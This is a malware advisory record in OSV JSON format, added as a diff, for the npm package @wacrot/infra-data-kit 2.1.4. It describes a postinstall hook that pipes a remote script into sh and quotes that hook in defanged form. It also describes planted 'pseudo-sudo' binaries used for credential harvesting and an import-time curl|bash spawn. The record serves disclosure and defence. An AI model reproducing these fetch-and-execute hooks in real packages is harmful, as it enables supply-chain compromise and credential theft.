@@ -1,0 +1,65 @@
+{
+  "schema_version": "1.6.0",
+  "id": "LWA-2026-4933",
+  "aliases": [
+    "MAL-2026-5834"
+  ],
+  "modified": "2026-06-12T23:07:11Z",
+  "published": "2026-06-12T23:06:04Z",
+  "summary": "Malicious code in @wacrot/infra-data-kit (npm)",
+  "details": "The postinstall hook (wget -qO- hxxps://web[.]stanford[.]edu/~pseay/pliant/setup[.]sh | sh) downloads and executes a remote shell script from a personal Stanford.edu directory — an established pattern for hosting payloads on compromised.edu accounts. The bundled setup-env.sh downloads two binaries named 'pseudo-sudo' and 'et' into ~/.so-sorry-sarah and prepends that directory to PATH via shell config modification. 'pseudo-sudo' is a strong credential-harvesting indicator (sudo impersonation). Separately, src/index.js defines and calls addSupport() at module load time, which spawns a detached unref'd bash process that pipes curl|bash from example[.]com (a placeholder; the scaffold for a remote payload is present). The library code (GIS data parsing) is a decoy — well-written and documented, but the real purpose is the postinstall payload chain and the dormant spawn-on-import backdoor. No token-theft markers were found, but the credential-theft vector (pseudo-sudo) and multi-stage remote execution patterns are clear.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "@wacrot/infra-data-kit",
+        "purl": "pkg:npm/%40wacrot/infra-data-kit@2.1.4"
+      },
+      "versions": [
+        "2.1.4"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "name": "Embedded Malicious Code"
+          }
+        ],
+        "leitwacht": {}
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/@wacrot/infra-data-kit/v/2.1.4"
+    },
+    {
+      "type": "REPORT",
+      "url": "https://threatintel.leitwacht.eu/d/LWA-2026-4933"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Leitwacht",
+      "type": "FINDER",
+      "contact": [
+        "https://threatintel.leitwacht.eu"
+      ]
+    }
+  ],
+  "database_specific": {
+    "leitwacht": {
+      "category": "malware",
+      "first_seen_at": "2026-06-12T23:06:04Z",
+      "indicators_observed": {
+        "domain_observed": [
+          "example[.]com"
+        ],
+        "url_observed": [
+          "hxxps://web[.]stanford[.]edu/"
+        ]
+      }
+    }
+  }
+}
